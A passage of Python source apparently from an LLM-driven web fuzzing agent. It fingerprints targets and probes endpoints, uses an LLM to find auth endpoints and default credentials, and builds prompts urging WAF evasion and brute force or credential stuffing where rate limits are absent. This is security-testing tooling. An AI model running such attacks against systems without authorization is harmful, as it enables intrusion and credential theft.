            _graceful_degradation.store_partial_result(action, decision)
            raise
        
        except Exception as e:
            _graceful_degradation.record_failure()
            raise
    
    async def _fingerprint_targets(self):
        """Fingerprint all targets to detect tech stack, WAF, and establish response baselines."""
        for target in self.session.targets:
            try:
                # Collect multiple baseline responses for diffing engine
                baseline_responses = []
                
                for i in range(3):  # Collect 3 baseline samples
                    result = await execute_fuzzing_request(target, "", position="none", timeout=10)
                    if result.get("success"):
                        baseline_responses.append((
                            result.get("status_code", 200),
                            result.get("headers", {}),
                            result.get("body", ""),
                            result.get("response_time", 0) / 1000.0,  # Convert to seconds
                        ))
                        
                        # Use first response for fingerprinting
                        if i == 0:
                            cookies = []
                            if "set-cookie" in result.get("headers", {}):
                                cookies = [result["headers"]["set-cookie"]]
                            
                            target.fingerprint = fingerprint_response(
                                headers=result.get("headers", {}),
                                body=result.get("body", ""),
                                cookies=cookies,
                            )
                            
                            # Run initial passive scan on first response
                            if PASSIVE_SCANNER_AVAILABLE:
                                passive_findings = run_passive_scan(
                                    url=target.url,
                                    status_code=result.get("status_code", 200),
                                    headers=result.get("headers", {}),
                                    body=result.get("body", ""),
                                )
                                if passive_findings:
                                    logger.info(f"Passive scan found {len(passive_findings)} issues on {target.url}")
                                    # Store for later reporting
                                    if not hasattr(target, 'passive_findings'):
                                        target.passive_findings = []
                                    target.passive_findings.extend(passive_findings)
                    
                    # Small delay between baseline requests
                    await asyncio.sleep(0.1)
                
                # Establish baseline for diffing engine
                if DIFFING_ENGINE_AVAILABLE and baseline_responses:
                    method = target.method.value if hasattr(target.method, 'value') else str(target.method)
                    baseline_profile = establish_response_baseline(
                        url=target.url,
                        method=method,
                        responses=baseline_responses,
                    )
                    if baseline_profile.get("available"):
                        logger.info(f"Established response baseline for {target.url}: avg_time={baseline_profile.get('avg_response_time'):.3f}s")
                
            except Exception as e:
                logger.warning(f"Failed to fingerprint {target.url}: {e}")
                target.fingerprint = TechFingerprint()
    
    async def _initial_discovery(self) -> Dict[str, Any]:
        """
        Perform comprehensive initial auto-discovery on all targets.
        
        This INTELLIGENT discovery engine:
        1. Fetches the target page and analyzes HTML structure
        2. Runs ACTIVE reconnaissance with endpoint probing
        3. Detects authentication mechanisms (SRP, OAuth2, JWT, etc.)
        4. Identifies security features (CSRF, rate limiting, WAF, lockout)
        5. Probes common endpoints to find APIs, admin panels, docs
        6. Analyzes error behavior for information disclosure
        7. Understands multi-step authentication flows
        8. Generates attack technique recommendations
        """
        all_endpoints = []
        all_params = []
        recon_results = []
        intelligent_recon_results = []
        
        for target in self.session.targets:
            try:
                result = await execute_fuzzing_request(target, "", position="none", timeout=15)
                if not result.get("success"):
                    logger.warning(f"Initial request failed for {target.url}: {result.get('error')}")
                    continue
                
                body = result.get("body", "")
                headers = result.get("headers", {})
                content_type = headers.get("content-type", "")
                
                # DEBUG: Log what we received
                logger.info(f"[DISCOVERY] Received {len(body)} bytes from {target.url}")
                logger.info(f"[DISCOVERY] Content-Type: {content_type}")
                
                cookies = []
                if "set-cookie" in headers:
                    cookies = [headers["set-cookie"]] if isinstance(headers["set-cookie"], str) else headers["set-cookie"]
                
                # ========================================
                # INTELLIGENT ACTIVE RECONNAISSANCE
                # ========================================
                try:
                    # Use the intelligent reconnaissance engine with active probing
                    intelligent_recon = await perform_intelligent_reconnaissance(
                        target_url=target.url,
                        html_content=body,
                        headers=headers,
                        cookies=cookies,
                        active_probing=True,  # Actively probe endpoints
                        probe_depth="normal",  # Probe common endpoints
                    )
                    intelligent_recon_results.append(intelligent_recon)
                    
                    # ========================================
                    # LLM-POWERED JAVASCRIPT ANALYSIS
                    # This is the "intelligent" part - let the LLM read the code
                    # like a human security researcher would
                    # ========================================
                    try:
                        llm_js_analysis = await analyze_javascript_with_llm(
                            html_content=body,
                            base_url=target.url,
                        )
                        
                        # Add LLM-discovered endpoints
                        if llm_js_analysis.get("endpoints"):
                            logger.info(f"[LLM-DISCOVERY] LLM found {len(llm_js_analysis['endpoints'])} endpoints")
                            for ep_info in llm_js_analysis["endpoints"]:
                                ep_path = ep_info.get("path", "")
                                if ep_path:
                                    ep_url = urllib.parse.urljoin(target.url, ep_path)
                                    logger.info(f"[LLM-DISCOVERY]   -> {ep_info.get('method', 'POST')} {ep_path} ({ep_info.get('purpose', 'unknown')})")
                                    all_endpoints.append(DiscoveredEndpoint(
                                        url=ep_url,
                                        method=ep_info.get("method", "POST"),
                                        source="llm_javascript_analysis",
                                        confidence=ep_info.get("confidence", 0.9),
                                    ))
                                    
                                    # Also add to high-value targets if auth-related
                                    purpose = ep_info.get("purpose", "").lower()
                                    if any(kw in purpose for kw in ["auth", "login", "session", "token", "srp"]):
                                        intelligent_recon.high_value_targets.append({
                                            "type": "llm_discovered_auth_endpoint",
                                            "endpoint": ep_url,
                                            "description": f"LLM discovered: {ep_info.get('purpose', 'Auth endpoint')}",
                                            "method": ep_info.get("method", "POST"),
                                            "priority": "critical",
                                            "attack_vectors": ["Authentication bypass", "Credential attacks", "Session manipulation"],
                                        })
                        
                        # Update auth info from LLM analysis
                        if llm_js_analysis.get("auth_mechanism"):
                            auth_info = llm_js_analysis["auth_mechanism"]
                            logger.info(f"[LLM-DISCOVERY] Auth mechanism: {auth_info.get('type')} via {auth_info.get('auth_endpoint')}")
                            
                            # Update recon auth info if LLM found better data
                            if recon and recon.authentication:
                                if auth_info.get("auth_endpoint") and not recon.authentication.auth_endpoint:
                                    recon.authentication.auth_endpoint = urllib.parse.urljoin(
                                        target.url, auth_info["auth_endpoint"]
                                    )
                                    recon.authentication.login_endpoint = recon.authentication.auth_endpoint
                                
                                # Update mechanism if we detected SRP or other specific protocols
                                auth_type = auth_info.get("type", "").lower()
                                if auth_type == "srp" and recon.authentication.mechanism == AuthMechanism.UNKNOWN:
                                    recon.authentication.mechanism = AuthMechanism.SRP
                                elif auth_type == "jwt" and recon.authentication.mechanism == AuthMechanism.UNKNOWN:
                                    recon.authentication.mechanism = AuthMechanism.JWT
                                elif auth_type == "oauth" and recon.authentication.mechanism == AuthMechanism.UNKNOWN:
                                    recon.authentication.mechanism = AuthMechanism.OAUTH2
                        
                        # Extract hidden fields (default credentials!)
                        if llm_js_analysis.get("hidden_fields"):
                            for field in llm_js_analysis["hidden_fields"]:
                                if field.get("default_value"):
                                    logger.warning(f"[LLM-DISCOVERY] Found default credential: {field.get('name')}={field.get('default_value')}")
                        
                        # Store LLM analysis results
                        if not hasattr(intelligent_recon, 'llm_analysis'):
                            intelligent_recon.llm_analysis = None
                        intelligent_recon.llm_analysis = llm_js_analysis
                        
                    except Exception as llm_err:
                        logger.debug(f"LLM JavaScript analysis skipped: {llm_err}")
                    
                    # DEBUG: Log intelligent recon results
                    logger.info(f"[DISCOVERY] Intelligent recon complete for {target.url}")
                    logger.info(f"[DISCOVERY] High-value targets found: {len(intelligent_recon.high_value_targets)}")
                    for hvt in intelligent_recon.high_value_targets:
                        logger.info(f"[DISCOVERY]   HVT: {hvt.get('type')} - {hvt.get('description', hvt.get('endpoint', 'N/A'))[:80]}")
                    
                    # Store intelligent reconnaissance results on the target
                    if not hasattr(target, 'intelligent_recon'):
                        target.intelligent_recon = None
                    target.intelligent_recon = intelligent_recon
                    
                    # Get passive recon from intelligent recon
                    recon = intelligent_recon.passive_recon
                    if recon:
                        recon_results.append(recon)
                        target.recon_result = recon
                        # DEBUG: Log passive recon auth info
                        if recon.authentication:
                            logger.info(f"[DISCOVERY] Auth mechanism: {recon.authentication.mechanism}")
                            logger.info(f"[DISCOVERY] Auth endpoint: {recon.authentication.auth_endpoint}")
                            logger.info(f"[DISCOVERY] Login endpoint: {recon.authentication.login_endpoint}")
                            logger.info(f"[DISCOVERY] Username field: {recon.authentication.username_field}")
                            logger.info(f"[DISCOVERY] Password field: {recon.authentication.password_field}")
                        if recon.discovered_forms:
                            logger.info(f"[DISCOVERY] Forms found: {len(recon.discovered_forms)}")
                            for form in recon.discovered_forms:
                                logger.info(f"[DISCOVERY]   Form: {form.get('id', 'unknown')} - is_login={form.get('is_login_form', False)}")
                    
                    # Log WAF detection
                    if intelligent_recon.waf_detected:
                        logger.warning(f"WAF detected on {target.url}: {intelligent_recon.waf_type}")
                    
                    # Log authentication flow complexity
                    if intelligent_recon.auth_flow_complexity != "unknown":
                        logger.info(f"Auth flow complexity: {intelligent_recon.auth_flow_complexity} on {target.url}")
                        for step in intelligent_recon.auth_flow_steps:
                            logger.info(f"  Step {step.order}: {step.method} {step.endpoint} -> {step.expected_response}")
                    
                    # Add high-value targets discovered by intelligent recon
                    for hvt in intelligent_recon.high_value_targets:
                        if hvt.get("endpoint"):
                            all_endpoints.append(DiscoveredEndpoint(
                                url=hvt["endpoint"],
                                method="GET",
                                source=f"intelligent_recon_{hvt.get('type', 'unknown')}",
                                confidence=0.95,
                            ))
                        elif hvt.get("endpoints"):
                            for ep in hvt["endpoints"]:
                                if ep:
                                    all_endpoints.append(DiscoveredEndpoint(
                                        url=urllib.parse.urljoin(target.url, ep),
                                        method="POST",
                                        source=f"intelligent_recon_{hvt.get('type', 'unknown')}",
                                        confidence=0.95,
                                    ))
                    
                    # Add endpoints discovered from probing
                    for probe in intelligent_recon.common_endpoint_probes:
                        if probe.status_code in [200, 301, 302, 401, 403]:  # Interesting endpoints
                            probe_url = urllib.parse.urljoin(target.url, probe.endpoint)
                            all_endpoints.append(DiscoveredEndpoint(
                                url=probe_url,
                                method="GET",
                                source="active_probe",
                                confidence=0.90 if probe.status_code == 200 else 0.75,
                            ))
                    
                    # Add API documentation URL if found
                    if intelligent_recon.api_documentation_url:
                        logger.info(f"API documentation found: {intelligent_recon.api_documentation_url}")
                        all_endpoints.append(DiscoveredEndpoint(
                            url=intelligent_recon.api_documentation_url,
                            method="GET",
                            source="api_docs_discovery",
                            confidence=0.99,
                        ))
                    
                    # Extract authentication info from passive recon
                    if recon and recon.authentication and recon.authentication.mechanism != AuthMechanism.UNKNOWN:
                        logger.info(f"Detected authentication: {recon.authentication.mechanism.value} on {target.url}")
                        
                        # Add auth endpoint as high-priority target
                        if recon.authentication.auth_endpoint:
                            auth_url = urllib.parse.urljoin(target.url, recon.authentication.auth_endpoint)
                            all_endpoints.append(DiscoveredEndpoint(
                                url=auth_url,
                                method="POST",
                                parameters=[recon.authentication.username_field, recon.authentication.password_field],
                                source="auth_discovery",
                                confidence=0.99,
                            ))
                        
                        if recon.authentication.login_endpoint:
                            all_endpoints.append(DiscoveredEndpoint(
                                url=recon.authentication.login_endpoint,
                                method="POST",
                                parameters=[recon.authentication.username_field, recon.authentication.password_field],
                                source="auth_discovery",
                                confidence=0.99,
                            ))
                    
                    # Add discovered endpoints from passive reconnaissance
                    if recon:
                        all_endpoints.extend(recon.discovered_endpoints)
                        all_params.extend(recon.discovered_parameters)
                        
                        # Add parameters from API patterns
                        for api_pattern in recon.api_patterns:
                            if api_pattern.get("endpoint"):
                                all_endpoints.append(DiscoveredEndpoint(
                                    url=api_pattern["endpoint"],
                                    method=api_pattern.get("method", "GET"),
                                    source="javascript_api",
                                    confidence=0.85,
                                ))
                    
                    # Store security info
                    if recon and recon.security_features:
                        if recon.security_features.rate_limiting:
                            logger.info(f"Rate limiting detected on {target.url}")
                        if recon.security_features.brute_force_protection:
                            logger.info(f"Brute force protection detected on {target.url}")
                        if recon.security_features.csrf_protection:
                            logger.info(f"CSRF protection detected on {target.url}")
                    
                except Exception as recon_err:
                    logger.warning(f"Intelligent reconnaissance failed for {target.url}: {recon_err}")
                    # Fall back to basic enhanced reconnaissance
                    try:
                        recon = await perform_enhanced_reconnaissance(
                            target_url=target.url,
                            html_content=body,
                            headers=headers,
                            cookies=cookies,
                            fetch_scripts=True,
                        )
                        recon_results.append(recon)
                        target.recon_result = recon
                    except Exception:
                        pass
                
                # ========================================
                # BASIC DISCOVERY (fallback/additional)
                # ========================================
                # Discover endpoints from HTML
                if "html" in content_type.lower() or body.strip().startswith("<"):
                    endpoints = discover_endpoints_from_html(body, target.url)
                    all_endpoints.extend(endpoints)
                
                # Discover endpoints from JSON
                if "json" in content_type.lower() or body.strip().startswith("{"):
                    endpoints = discover_endpoints_from_json(body, target.url)
                    all_endpoints.extend(endpoints)
                
                # Discover parameters
                params = discover_parameters_from_response(body, content_type)
                all_params.extend(params)
                target.discovered_params.extend(params)
                
            except Exception as e:
                logger.warning(f"Discovery failed for {target.url}: {e}")
        
        # ========================================
        # RESOLVE "AUTO" HTTP METHODS
        # If target method is AUTO, determine best method from discovery
        # ========================================
        for target in self.session.targets:
            if target.method.upper() == "AUTO":
                # Find best method from discovered endpoints for this target
                best_method = "GET"  # Default fallback
                highest_confidence = 0.0
                
                # Check discovered endpoints that match this target's URL
                target_base = target.url.rstrip('/').lower()
                for ep in all_endpoints:
                    ep_base = ep.url.rstrip('/').lower()
                    # Exact match or same base path
                    if ep_base == target_base or ep_base.startswith(target_base):
                        if ep.confidence > highest_confidence:
                            highest_confidence = ep.confidence
                            best_method = ep.method
                
                # If no good match found, use heuristics
                if highest_confidence < 0.5:
                    url_lower = target.url.lower()
                    # Auth-related endpoints typically use POST
                    if any(kw in url_lower for kw in ['login', 'auth', 'signin', 'authenticate', 'session', 'token']):
                        best_method = "POST"
                    # API endpoints often use various methods
                    elif '/api/' in url_lower:
                        # Check if we have body - suggests POST
                        if target.body:
                            best_method = "POST"
                        else:
                            best_method = "GET"
                    else:
                        best_method = "GET"
                
                logger.info(f"[AUTO-METHOD] Resolved method for {target.url}: {target.method} -> {best_method} (confidence: {highest_confidence:.2f})")
                target.method = best_method
        
        # Deduplicate endpoints
        existing_urls = {t.url for t in self.session.targets}
        unique_endpoints = []
        seen_urls = set()
        
        for endpoint in all_endpoints:
            if endpoint.url not in existing_urls and endpoint.url not in seen_urls:
                seen_urls.add(endpoint.url)
                unique_endpoints.append(endpoint)
                self.session.discovered_endpoints.append(endpoint)
                
                # Add as new target (limit to 50)
                if len(self.session.targets) < 50:
                    new_target = FuzzingTarget(
                        url=endpoint.url,
                        method=endpoint.method,
                        headers=dict(self.session.targets[0].headers) if self.session.targets else {},
                        parameters=endpoint.parameters,
                    )
                    self.session.targets.append(new_target)
        
        unique_params = list(set(all_params))
        
        # Build comprehensive discovery result
        discovery_result = {
            "endpoints_found": [e.to_dict() for e in unique_endpoints[:30]],
            "parameters_found": unique_params[:50],
            "total_targets": len(self.session.targets),
        }
        
        # Add INTELLIGENT reconnaissance summary
        if intelligent_recon_results:
            intel_summary = {
                "targets_analyzed": len(intelligent_recon_results),
                "waf_detected": any(ir.waf_detected for ir in intelligent_recon_results),
                "waf_types": [ir.waf_type for ir in intelligent_recon_results if ir.waf_detected],
                "api_docs_found": [ir.api_documentation_url for ir in intelligent_recon_results if ir.api_documentation_url],
                "auth_flow_complexity": [ir.auth_flow_complexity for ir in intelligent_recon_results if ir.auth_flow_complexity != "unknown"],
                "auth_flows": [],
                "high_value_targets": [],
                "recommended_techniques": [],
                "error_disclosure_levels": [],
                "rate_limit_info": [],
                "server_quirks": [],
            }
            
            for ir in intelligent_recon_results:
                if ir.auth_flow_steps:
                    intel_summary["auth_flows"].append({
                        "url": ir.target_url,
                        "complexity": ir.auth_flow_complexity,
                        "steps": [{"order": s.order, "endpoint": s.endpoint, "method": s.method} for s in ir.auth_flow_steps],
                    })
                
                intel_summary["high_value_targets"].extend(ir.high_value_targets)
                intel_summary["recommended_techniques"].extend(ir.recommended_techniques)
                intel_summary["server_quirks"].extend(ir.server_quirks)
                
                if ir.error_disclosure_level != "unknown":
                    intel_summary["error_disclosure_levels"].append({
                        "url": ir.target_url,
                        "level": ir.error_disclosure_level,
                    })
                
                if ir.rate_limit_threshold or ir.rate_limit_bypass_possible:
                    intel_summary["rate_limit_info"].append({
                        "url": ir.target_url,
                        "threshold": ir.rate_limit_threshold,
                        "window_seconds": ir.rate_limit_window_seconds,
                        "bypass_possible": ir.rate_limit_bypass_possible,
                    })
            
            # Deduplicate recommendations
            intel_summary["recommended_techniques"] = list(set(intel_summary["recommended_techniques"]))
            intel_summary["server_quirks"] = list(set(intel_summary["server_quirks"]))
            
            discovery_result["intelligent_reconnaissance"] = intel_summary
        
        # Add passive reconnaissance summary
        if recon_results:
            recon_summary = {
                "targets_analyzed": len(recon_results),
                "authentication_detected": [],
                "security_features": [],
                "potential_vulnerabilities": [],
                "api_patterns_found": 0,
                "javascript_functions_found": 0,
            }
            
            for recon in recon_results:
                if recon.authentication and recon.authentication.mechanism != AuthMechanism.UNKNOWN:
                    recon_summary["authentication_detected"].append({
                        "url": recon.target_url,
                        "mechanism": recon.authentication.mechanism.value,
                        "login_endpoint": recon.authentication.login_endpoint,
                        "auth_endpoint": recon.authentication.auth_endpoint,
                        "csrf_protected": bool(recon.authentication.csrf_token_value),
                        "rate_limited": recon.authentication.rate_limit_detected,
                        "lockout_detected": recon.authentication.lockout_detected,
                        "mfa_detected": recon.authentication.mfa_detected,
                        "srp_details": recon.authentication.srp_details if recon.authentication.mechanism == AuthMechanism.SRP else None,
                    })
                
                if recon.security_features:
                    recon_summary["security_features"].append({
                        "url": recon.target_url,
                        "csrf": recon.security_features.csrf_protection,
                        "csp": recon.security_features.content_security_policy,
                        "rate_limiting": recon.security_features.rate_limiting,
                        "captcha": recon.security_features.captcha_protection,
                        "brute_force_protection": recon.security_features.brute_force_protection,
                    })
                
                recon_summary["potential_vulnerabilities"].extend(recon.potential_vulnerabilities)
                recon_summary["api_patterns_found"] += len(recon.api_patterns)
                recon_summary["javascript_functions_found"] += len(recon.javascript_functions)
            
            discovery_result["reconnaissance"] = recon_summary
        
        return discovery_result
    
    async def _handle_generate_poc(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Generate proof-of-concept for a finding."""
        self.session.current_phase = FuzzingPhase.POC_GENERATION
        
        # Find the most recent exploitable finding
        exploitable_findings = [f for f in self.session.findings if f.exploitable and not f.proof_of_concept]
        
        if not exploitable_findings:
            return {"type": "no_poc_needed", "message": "No exploitable findings without PoC"}
        
        finding = exploitable_findings[-1]
        target = self.session.targets[self.session.current_target_index]
        
        poc = generate_proof_of_concept(
            technique=finding.technique,
            endpoint=finding.endpoint,
            method=target.method,
            payload=finding.payload,
            headers=target.headers,
        )
        
        finding.proof_of_concept = poc
        
        return {
            "type": "poc_generated",
            "finding_id": finding.id,
            "poc": poc[:1000] + "..." if len(poc) > 1000 else poc,
        }
    
    def _build_context(self) -> str:
        """Build context for LLM decision."""
        target = self.session.targets[self.session.current_target_index] if self.session.targets else None
        
        # Include fingerprint info
        fingerprint_info = None
        if target and target.fingerprint:
            fingerprint_info = target.fingerprint.to_dict()
        
        # Get active attack chains
        active_chains = [c.to_dict() for c in self.session.attack_chains if c.status == "in_progress"]
        
        # Build list of allowed techniques from scan profile
        allowed_techniques = None
        if self.session.enabled_techniques:
            allowed_techniques = [t.value for t in self.session.enabled_techniques]
        
        # Include INTELLIGENT reconnaissance results if available
        intelligent_recon_info = None
        if target and hasattr(target, 'intelligent_recon') and target.intelligent_recon:
            ir = target.intelligent_recon
            intelligent_recon_info = {
                "waf_detected": ir.waf_detected,
                "waf_type": ir.waf_type,
                "api_documentation_url": ir.api_documentation_url,
                "api_version_detected": ir.api_version_detected,
                "auth_flow_complexity": ir.auth_flow_complexity,
                "auth_flow_steps": [{"order": s.order, "endpoint": s.endpoint, "method": s.method, "expected": s.expected_response} for s in ir.auth_flow_steps],
                "error_disclosure_level": ir.error_disclosure_level,
                "rate_limit_threshold": ir.rate_limit_threshold,
                "rate_limit_bypass_possible": ir.rate_limit_bypass_possible,
                "session_mechanism": ir.session_mechanism,
                "high_value_targets": ir.high_value_targets[:5],
                "recommended_techniques": ir.recommended_techniques,
                "server_quirks": ir.server_quirks,
            }
        
        # Include passive reconnaissance results if available
        recon_info = None
        if target and hasattr(target, 'recon_result') and target.recon_result:
            recon = target.recon_result
            recon_info = {
                "authentication": recon.authentication.to_dict() if recon.authentication else None,
                "security_features": recon.security_features.to_dict() if recon.security_features else None,
                "api_patterns_count": len(recon.api_patterns),
                "forms_count": len(recon.discovered_forms),
                "potential_vulnerabilities": recon.potential_vulnerabilities[:5],
                "technology_hints": recon.technology_hints,
            }
        
        # Include discovered endpoints (not just count) - crucial for LLM to know what was found
        discovered_endpoints_list = []
        for ep in self.session.discovered_endpoints[:15]:  # Limit to 15 for context size
            ep_dict = ep.to_dict() if hasattr(ep, 'to_dict') else ep
            discovered_endpoints_list.append(ep_dict)
        
        # Include discovered forms from recon
        discovered_forms = []
        if target and hasattr(target, 'recon_result') and target.recon_result:
            discovered_forms = target.recon_result.discovered_forms[:10]  # Limit to 10
        
        context = {
            "phase": self.session.current_phase.value,
            "iteration": self.session.iterations,
            "max_iterations": self.session.max_iterations,
            "current_target": target.to_dict() if target else None,
            "fingerprint": fingerprint_info,
            "reconnaissance": recon_info,
            "intelligent_reconnaissance": intelligent_recon_info,
            "waf_detected": target.fingerprint.waf.value if target and target.fingerprint else "none",
            "current_target_index": self.session.current_target_index,
            "total_targets": len(self.session.targets),
            "current_technique": self.session.current_technique.value if self.session.current_technique else None,
            "techniques_tried_on_current": self.session.techniques_tried.get(
                target.url if target else "", []
            ),
            "total_findings": len(self.session.findings),
            "recent_findings": [f.to_dict() for f in self.session.findings[-5:]],
            "recent_history": self.session.fuzzing_history[-10:],
            # New context for enhanced capabilities - include ACTUAL endpoints not just count
            "discovered_endpoints_count": len(self.session.discovered_endpoints),
            "discovered_endpoints": discovered_endpoints_list,  # Include actual endpoints
            "discovered_forms": discovered_forms,  # Include discovered forms
            "discovered_params": target.discovered_params if target else [],
            "active_attack_chains": active_chains,
            "blind_detection_results": [r.to_dict() for r in self.session.blind_detection_results[-5:]],
            "baseline_response_time_ms": self.session.baseline_response_time,
            "callback_token": self.session.callback_token,
            "available_chain_templates": list(ATTACK_CHAIN_TEMPLATES.keys()),
            # Scan profile constraints
            "scan_profile_name": self.session.scan_profile_name,
            "allowed_techniques": allowed_techniques,
            "duplicate_findings_skipped": self.session.duplicate_findings_skipped,
        }
        
        # Build technique constraint text
        technique_constraint = ""
        if allowed_techniques:
            technique_constraint = f"""
IMPORTANT - SCAN PROFILE CONSTRAINT:
You MUST only use techniques from this list: {allowed_techniques}
Do NOT suggest techniques outside this list. The scan profile "{self.session.scan_profile_name}" restricts testing to these techniques only.
"""
        
        # Build INTELLIGENT reconnaissance insights
        intelligent_recon_insights = ""
        if intelligent_recon_info:
            intelligent_recon_insights = f"""
========================================
INTELLIGENT RECONNAISSANCE RESULTS
========================================
"""
            if intelligent_recon_info.get("waf_detected"):
                intelligent_recon_insights += f"""
⚠️ WAF DETECTED: {intelligent_recon_info.get('waf_type', 'Unknown')}
- You MUST use WAF evasion techniques in your payloads!
"""
            
            if intelligent_recon_info.get("auth_flow_complexity") not in ["unknown", None]:
                intelligent_recon_insights += f"""
🔐 AUTHENTICATION FLOW ANALYSIS:
- Complexity: {intelligent_recon_info.get('auth_flow_complexity')}
- Session mechanism: {intelligent_recon_info.get('session_mechanism')}
"""
                for step in intelligent_recon_info.get("auth_flow_steps", []):
                    intelligent_recon_insights += f"  Step {step['order']}: {step['method']} {step['endpoint']} → {step['expected']}\n"
            
            if intelligent_recon_info.get("api_documentation_url"):
                intelligent_recon_insights += f"""
📄 API DOCUMENTATION FOUND: {intelligent_recon_info.get('api_documentation_url')}
- Use this to discover additional endpoints and parameters!
"""
            
            if intelligent_recon_info.get("error_disclosure_level") == "verbose":
                intelligent_recon_insights += f"""
🔓 VERBOSE ERROR DISCLOSURE DETECTED
- Server reveals detailed error messages - useful for injection attacks!
"""
            
            if intelligent_recon_info.get("rate_limit_bypass_possible"):
                intelligent_recon_insights += f"""
⚡ NO RATE LIMITING DETECTED
- Brute force and credential stuffing may be possible
"""
            elif intelligent_recon_info.get("rate_limit_threshold"):
                intelligent_recon_insights += f"""
🚦 RATE LIMITING: {intelligent_recon_info.get('rate_limit_threshold')} requests
"""
            
            if intelligent_recon_info.get("high_value_targets"):
                intelligent_recon_insights += f"""
🎯 HIGH VALUE TARGETS DISCOVERED:
"""
                for hvt in intelligent_recon_info.get("high_value_targets", [])[:5]:
                    hvt_type = hvt.get('type', 'unknown')
                    hvt_endpoint = hvt.get('endpoint', hvt.get('description', 'N/A'))
                    intelligent_recon_insights += f"  - [{hvt_type}] {hvt_endpoint}\n"
                    
                    # Show attack vectors for login pages
                    if hvt_type in ["js_rendered_login_page", "srp_login_page", "router_admin_panel", "srp_authentication"]:
                        vectors = hvt.get('attack_vectors', [])[:3]
                        if vectors:
                            intelligent_recon_insights += f"    Attack vectors: {', '.join(vectors)}\n"
                        
                        # Show login endpoint if found
                        if hvt.get('login_endpoint'):
                            intelligent_recon_insights += f"    Login endpoint: {hvt['login_endpoint']}\n"
                        
                        # Show SRP endpoints if available
                        endpoints = hvt.get('endpoints', [])
                        if endpoints and any(e for e in endpoints):
                            intelligent_recon_insights += f"    API endpoints: {', '.join(e for e in endpoints if e)}\n"
            
            if intelligent_recon_info.get("recommended_techniques"):
                intelligent_recon_insights += f"""
💡 RECOMMENDED ATTACK TECHNIQUES:
{chr(10).join('  - ' + t for t in intelligent_recon_info['recommended_techniques'][:10])}
"""
            
            if intelligent_recon_info.get("server_quirks"):
                intelligent_recon_insights += f"""
🔧 SERVER QUIRKS/WEAKNESSES:
{chr(10).join('  - ' + q for q in intelligent_recon_info['server_quirks'])}
"""
        
        # Build passive reconnaissance insights
        recon_insights = ""
        if recon_info:
            auth = recon_info.get("authentication")
            if auth and auth.get("mechanism") != "unknown":
                recon_insights += f"""
AUTHENTICATION DISCOVERED:
- Mechanism: {auth.get('mechanism')}
- Login endpoint: {auth.get('login_endpoint')}
- Auth endpoint: {auth.get('auth_endpoint')}
- Username field: {auth.get('username_field')}
- Password field: {auth.get('password_field')}
- CSRF protected: {auth.get('csrf_protected', False)}
- Rate limited: {auth.get('rate_limit_detected', False)}
- Lockout detection: {auth.get('lockout_detected', False)}
- MFA detected: {auth.get('mfa_detected', False)}
"""
                if auth.get("srp_details"):
                    recon_insights += f"- SRP Details: {auth.get('srp_details')}\n"
            
            sec = recon_info.get("security_features")
            if sec:
                recon_insights += f"""
SECURITY FEATURES:
- CSRF protection: {sec.get('csrf_protection', False)}
- Rate limiting: {sec.get('rate_limiting', False)}
- Brute force protection: {sec.get('brute_force_protection', False)}
- CAPTCHA: {sec.get('captcha_protection', False)}
- CSP: {sec.get('content_security_policy', False)}
"""
            
            if recon_info.get("potential_vulnerabilities"):
                recon_insights += f"""
POTENTIAL VULNERABILITIES IDENTIFIED:
{chr(10).join('- ' + v for v in recon_info['potential_vulnerabilities'])}
"""
        
        # Build LLM JavaScript analysis insights (the intelligent part!)
        llm_analysis_insights = ""
        if target and hasattr(target, 'intelligent_recon') and target.intelligent_recon:
            llm_analysis = getattr(target.intelligent_recon, 'llm_analysis', None)
            if llm_analysis and llm_analysis.get('endpoints'):
                llm_analysis_insights = f"""
========================================
🧠 LLM JAVASCRIPT ANALYSIS RESULTS
========================================
The LLM analyzed the page's JavaScript code and found:

ENDPOINTS DISCOVERED BY LLM:
"""
                for ep in llm_analysis['endpoints'][:10]:
                    llm_analysis_insights += f"  - [{ep.get('method', 'POST')}] {ep.get('path')} - {ep.get('purpose', 'unknown')}\n"
                
                if llm_analysis.get('auth_mechanism'):
                    auth = llm_analysis['auth_mechanism']
                    llm_analysis_insights += f"""
AUTHENTICATION ANALYSIS:
  Type: {auth.get('type', 'unknown')}
  Library: {auth.get('library', 'N/A')}
  Auth Endpoint: {auth.get('auth_endpoint', 'N/A')}
  Details: {auth.get('details', 'N/A')}
"""
                
                if llm_analysis.get('hidden_fields'):
                    llm_analysis_insights += f"""
⚠️ HIDDEN FIELDS WITH DEFAULT VALUES (potential credentials):
"""
                    for field in llm_analysis['hidden_fields'][:5]:
                        llm_analysis_insights += f"  - {field.get('name', 'unknown')}: {field.get('default_value', 'N/A')}\n"
                
                if llm_analysis.get('csrf'):
                    csrf = llm_analysis['csrf']
                    llm_analysis_insights += f"""
CSRF PROTECTION:
  Token name: {csrf.get('token_name', 'N/A')}
  Location: {csrf.get('location', 'N/A')}
"""
                
                if llm_analysis.get('additional_findings'):
                    llm_analysis_insights += f"""
ADDITIONAL FINDINGS:
{chr(10).join('  - ' + f for f in llm_analysis['additional_findings'][:5])}
"""
        
        # Build discovered forms/endpoints insights
        discovery_insights = ""
        if discovered_endpoints_list:
            discovery_insights += f"""
========================================
DISCOVERED ENDPOINTS (from reconnaissance)
========================================
"""
            for ep in discovered_endpoints_list:
                ep_url = ep.get('url', 'N/A')
                ep_method = ep.get('method', 'GET')
                ep_params = ep.get('parameters', [])
                ep_source = ep.get('source', 'unknown')
                ep_confidence = ep.get('confidence', 0.0)
                discovery_insights += f"  - [{ep_method}] {ep_url}\n"
                if ep_params:
                    discovery_insights += f"    Parameters: {', '.join(ep_params)}\n"
                discovery_insights += f"    Source: {ep_source}, Confidence: {ep_confidence:.2f}\n"
        
        if discovered_forms:
            discovery_insights += f"""
========================================
DISCOVERED FORMS (fuzzable attack surface)
========================================
"""
            for form in discovered_forms:
                form_action = form.get('full_url', form.get('action', 'N/A'))
                form_method = form.get('method', 'GET')
                form_id = form.get('id', 'unknown')
                is_login = form.get('is_login_form', False)
                has_password = form.get('has_password_field', False)
                inputs = form.get('inputs', [])
                
                if is_login or has_password:
                    discovery_insights += f"  🔐 LOGIN FORM [{form_method}] {form_action}\n"
                else:
                    discovery_insights += f"  📝 Form '{form_id}' [{form_method}] {form_action}\n"
                
                if inputs:
                    input_names = [inp.get('name') or inp.get('id') for inp in inputs if inp.get('name') or inp.get('id')]
                    discovery_insights += f"    Input fields: {', '.join(input_names)}\n"
                
                if form.get('js_rendered'):
                    discovery_insights += f"    ⚡ JavaScript-rendered form (no HTML action)\n"
